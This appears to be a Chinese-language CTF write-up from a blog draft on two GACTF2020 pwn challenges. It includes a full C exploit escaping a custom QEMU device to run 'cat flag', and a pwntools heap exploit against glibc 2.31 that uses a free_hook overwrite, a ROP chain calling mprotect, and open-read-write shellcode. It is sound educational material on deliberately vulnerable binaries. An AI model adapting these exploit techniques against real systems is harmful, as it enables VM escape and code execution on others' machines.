---
layout: _drafts
title: gactf2020
date: 2020-09-02 16:43:40
tags: CTF writeup
categories: 
- GACTF2020
---

# GACTF2020

## babyqemu

### 漏洞分析

看下启动脚本，发现自定义了一个设备，应该洞就出在这里

```sh
#!/bin/sh
./qemu-system-x86_64 \
    -kernel /vmlinuz-4.8.0-52-generic  \
    -append "console=ttyS0 root=/dev/ram oops=panic panic=1 quiet"  \
    -initrd /rootfs.cpio  \
    -m 2G -nographic \
    -L /pc-bios -smp 1 \
    -device denc

```

逆一下找到mmio和pmio，发现有个带范围的地址读/写，调试一下发现0x20处有个elf的函数地址，借此可以得到proc_base进而得到system函数地址。

```c
unsigned __int64 __fastcall denc_mmio_read(__int64 a1, unsigned __int64 addr, int a3)
{
  unsigned __int64 result; // rax

  if ( a3 != 4 )
    return -1LL;
  result = addr & 3;
  if ( addr & 3 )
    return -1LL;
  if ( addr <= 0x24 )
    result = *(unsigned int *)(a1 + 0xB20 + 4 * (addr >> 2));
  return result;
}
//
unsigned __int64 __fastcall denc_mmio_write(unsigned __int64 a1, unsigned __int64 addr, unsigned int val, int a4)
{
  unsigned __int64 result; // rax

  result = a1;
  if ( a4 == 4 )
  {
    result = addr & 3;
    if ( !(addr & 3) && addr <= 0x24 )
    {
      result = val ^ *(_DWORD *)(a1 + 0xAF8 + addr);
      *(_DWORD *)(4 * (addr >> 2) + a1 + 0xB20) = result;
    }
  }
  return result;
}
//
signed __int64 __fastcall denc_pmio_read(__int64 a1, unsigned __int64 a2, int a3)
{
  if ( a3 != 4 || a2 & 3 )
    return -1LL;
  if ( a2 > 0x1F )
    return 0LL;
  return *(unsigned int *)(a1 + 0xB20 + 4 * (a2 >> 2));
}
//
unsigned __int64 __fastcall denc_pmio_write(unsigned __int64 a1, unsigned __int64 addr, unsigned int val, int a4)
{
  unsigned __int64 result; // rax

  result = a1;
  if ( a4 == 4 )
  {
    result = addr & 3;
    if ( !(addr & 3) && addr <= 7 )
    {
      result = val ^ *(_DWORD *)(a1 + 0xAF8 + 4 * addr);
      *(_DWORD *)(4 * addr + a1 + 0xB20) = result;
    }
  }
  return result;
}
```

因为好久没调试qemu的题了，这里还是写点备忘，调试的时候先写exp，`gcc ./exp.c -static -o exp`静态编译后拿`find . | cpio -o --format=newc > ../rootfs.cpio`打包到文件系统里，启动qemu后拿`ps -aux | grep qemu`看下进程号，`sudo gdb attach -q [pid]`跟进去，如果函数调用比较多可以先不attach，等到getchar执行时再跟。

![mem](./1.png)

之后打算找个函数调用的位置，开始没找到，因为IDA的问题，之后查看system_ptr的引用，发现了mmio_read的一处隐藏后门，在输入地址是0x660和0x664时会leak出system_compat函数的libc地址，到这里其实也没什么用，毕竟我们已经有system@plt了，但是这启发了我们去看汇编，终于最后在pmio_write里发现了另一处后门，当输入地址是0x660时触发调用刚才函数指针的位置。参数为偏移为0的地址内容。

```
.text:00000000003AA14A                 cmp     [rbp+var_20], 660h
.text:00000000003AA152                 jnz     short locret_3AA17C
.text:00000000003AA154                 mov     rax, [rbp+var_10]
.text:00000000003AA158                 mov     rax, [rax+0B40h]
.text:00000000003AA15F                 mov     rdx, [rbp+var_10]
.text:00000000003AA163                 lea     rcx, [rdx+0B20h]
.text:00000000003AA16A                 mov     edx, 0
.text:00000000003AA16F                 mov     esi, 0
.text:00000000003AA174                 mov     rdi, rcx
.text:00000000003AA177                 call    rax
```

qemu启动时会通过读取随机数到heap上，每次赋值前要和对应的随机数异或，因此先通过异或0让它们的值leak出，随后写入system@plt以及`cat flag`字符串

### exp.c

```c
#include <sys/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/types.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc000;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint64_t addr,uint32_t value)
{
    *((uint32_t *)(mmio_mem+addr)) = value;
}

uint64_t mmio_read(uint64_t addr)
{
    return *((uint64_t*)(mmio_mem+addr));
}

void pmio_write(uint32_t addr,uint32_t value)
{
    outl(value,addr);
}

uint64_t pmio_read(uint64_t addr)
{
    return (uint64_t)(inl(addr));
}

uint64_t pmio_abread(uint64_t offset)
{
    //return the value of (addr >> 2)
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint64_t offset,uint64_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main()
{
// Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
    if (iopl(3) !=0 )
        die("I/O permission is not enough");
    //pmio_abwrite(0x100,0x12345678);
    //leak proc base
    unsigned int proc_high = mmio_read(0x24);
    printf("proc high 0x%x\n",proc_high);
    unsigned int proc_low  = mmio_read(0x20);
    printf("proc low 0x%x\n",proc_low);
    unsigned long long proc_base = ((proc_high * 0x100000000)+proc_low-3841704);
    printf("proc base 0x%llx\n",proc_base);
    unsigned long long system_addr = proc_base + 0x2ccb60;
    printf("system addr 0x%llx\n",system_addr);
    //leak rand1
    mmio_write(0,0);
    mmio_write(4,0);
    mmio_write(8,0);
    mmio_write(0x20,0);
    mmio_write(0x24,0);
    unsigned long long rand1 = ((uint32_t)(mmio_read(4))*0x100000000)+((uint32_t)mmio_read(0));
    printf("rand1 val:0x%llx\n",rand1);
    unsigned int tail = mmio_read(8);
    printf("tail val:0x%x\n",tail);
    //leak rand2

    unsigned long long rand2 = ((uint32_t)mmio_read(0x24)*0x100000000)+((uint32_t)mmio_read(0x20));
    printf("rand2 val:0x%llx\n",rand2);
    //write command
    mmio_write(0,0x20746163^(rand1&0xffffffff));
    mmio_write(4,0x67616c66^(rand1>>32));
    mmio_write(8,tail);
    //write system
    mmio_write(0x20,(system_addr&0xffffffff)^(rand2));
    mmio_write(0x24,(system_addr>>32)^(rand2>>32));
    pmio_write(pmio_base+0x660,1);
    return 0;
}
```

### 踩坑

这里有个地方困扰我很久，在写入数据的时候只能写入0/0x20，而不能写入0x4/0x24。之后发现mmio_write函数写的有问题，把uint64_t改成32即可。

## card

libc 2.31，典型的orw题目，这里记一下如何找好用的gadget以及orw的常规思路

### 程序逻辑

Add次数最多0x100次，读取的数据首先放到bss段，之后再strcpy拷贝到heap上。出题人可能只想到了strcpy造成的零字节截断，因而预期解是2.29下的off-by-null。实际上因为数据有残留，这里还可以造成off-by-one以及溢出。另外有个后门可以对chunk编辑三次。

```c
__int64 __fastcall get_input(__int64 a1, int sz)
{
  __asm { endbr64 }
  memset_0(&temp_data, 0LL, sz);
  sub_1160();
  return sub_1110(a1, &temp_data);
}
//
__int64 __usercall Backdoor@<rax>(__int64 a1@<rdi>, __int64 a2@<rsi>, __int64 a3@<rbp>)
{
  __int64 result; // rax
  __int64 v4; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v4 = a3;
  sub_1120();
  if ( back_door_times == 3 )
  {
    sub_1120();
    sub_11B0(0LL);
  }
  ++back_door_times;
  sub_1140("Index: ");
  result = sub_143F((__int64)&v4);
  if ( (unsigned int)result <= 0xFF )
  {
    result = qword_4460[(unsigned int)result];
    if ( result )
    {
      sub_1120();
      sub_1160();                               // UAF
      result = sub_1120();
    }
  }
  return result;
}
```

### 漏洞利用

通过off-by-one构造overlapping，配合后门改fd到stdout泄露libc，注意bss的长度其实是有限的，如果数据过长会导致写到非法内存区而失败。此后的做法有两种，一种是free_hook+setcontext，2.31下的setcontext参数由rdx控制，因而需要寻找一些magic_gadget。这里寻找的方式是通过IDA将libc的asm导出到文件中，直接find相应的指令，比如这里我通过vscode搜索`mov rdx, [rdi+`，即可在libc中找到相关的汇编(这里大概有90条结果，挨个看下)，筛选后得到一个好用的gadget如下。之后分配到free_hook改为magic_gadget并在后面布置frame，free(__free_hook)触发调用即可。
```asm
//here
loc_1547A0:
mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]
```

另一种方式个人觉得实用性更好一点，首先将free_hook改为printf，通过栈上脏数据leak出返回地址位置，通过第三次的UAF改到返回地址处布置rop调用mprotect改栈区为可执行，并跳转到后面的shellcode orw读取flag。官方那边有第一种方式的exp，这里我贴下第二种。

### exp.py

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./card')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug == 2:
    libc = ELF('./libc.so.6')
    p = process('./card',env={'LD_PRELOAD':'./libc.so.6'})
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process("./card")

def Add(size):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil("Size: ")
    p.sendline(str(size))

def Edit(index,content,isEdit=True):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(index))
    if isEdit:
        p.recvuntil("Message:")
        p.send(content)

def Delete(index):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Backdoor(index,content):
    p.recvuntil('Choice:')
    p.sendline('5')
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Message:")
    p.send(content)


def exp():
    #leak libc
    Add(0x18)#0
    Add(0x80)#1
    Add(0x90)#2
    Add(0x30)#3
    Add(0x3e0)#4
    Add(0x20)#5
    Add(0x90)#6
    Add(0x90)#7
    Add(0x90)#8
    Add(0x20)#9
    Edit(2,'a'*0x18+'\x61\x05')
    Delete(0)

    Add(0)
    Edit(0,'a',False)

    Delete(1)
    Delete(6)
    Delete(2)
    Add(0x80)#1
    Add(0x4b0)#2
    if debug == 2:
        Backdoor(2,'\xa0\x26')
    else:
        Backdoor(2,'\xa0\xa6')

    Edit(5,'a'*0x18+'\x61\x05')
    Delete(0)
    Add(0)
    Edit(0,'a',False)

    Delete(1)
    Add(0xa0)#1
    Edit(1,'a'*0x88+'\xa1\x00')
    Add(0x90)#6

    Add(0x90)#10
    Backdoor(10,p64(0xfbad1800)+p64(0)*3+'\x00')
    p.recvn(10)
    libc_base = u64(p.recvn(8)) - (0x7ffff7fb9980-0x7ffff7dce000)
    log.success("libc base => " + hex(libc_base))
    libc.address = libc_base
    #
    Delete(7)
    Delete(6)
    Edit(1,'a'*0x88+'b'*0x8+p64(libc.sym['__free_hook']))
    for i in range(7):
        Edit(1,'a'*0x88+'b'*(7-i))
    Edit(1,'a'*0x88+'\xa1')

    Add(0x90)#6
    magic = libc_base + 0x1547A0
    '''
    loc_1547A0:
        mov     rdx, [rdi+8]
        mov     [rsp+0C8h+var_C8], rax
        call    qword ptr [rdx+20h]
    '''

    Add(0x90)#7

    Edit(7,p64(libc.sym['printf']))

    Edit(6,"%8$p")

    Delete(6)
    p.recvuntil("0x")
    stack_addr = int(p.recvuntil("[+]",drop=True),16) - 0x20 + 8
    log.success("stack addr => " + hex(stack_addr))
    for i in range(6):
        Edit(7,'a'*(5-i)+'\x00')

    Delete(8)
    Delete(2)

    Edit(1,'a'*0x88+'b'*0x8+p64(stack_addr))

    for i in range(7):
        Edit(1,'a'*0x88+'b'*(7-i))
    Edit(1,'a'*0x88+'\xa1')


    Add(0x98)#6

    gdb.attach(p,'b *0x0000555555554000+0x17bb')
    Add(0x98)#8

    p_rdi = libc_base + 0x0000000000026b72
    p_rsi = libc_base + 0x0000000000027529
    p_rax_rdx_r = libc_base + 0x00000000001626d5
    syscall = libc_base + 0x0000000000066229

    rops = flat([
            p_rdi,stack_addr&0xfffffffff000,
            p_rsi,0x1000,
            p_rax_rdx_r,10,7,0,
            syscall
            ])
    payload = rops + p64(len(rops)+stack_addr+0x8)
    sc = asm('''
            mov rdi,qword ptr {0[0]}
            xor esi,esi
            xor edx,edx
            mov eax,2
            syscall
            mov edi,eax
            mov rsi,qword ptr {0[1]}
            mov edx,0x30
            xor eax,eax
            syscall
            mov edi,1
            mov rsi,qword ptr {0[1]}
            mov eax,1
            syscall
            '''.format([hex(stack_addr+0x90),hex(stack_addr+0x200)]))
    payload += sc + './flag'
    print hex(len(payload))
    Backdoor(6,payload)


    p.interactive()

exp()

```
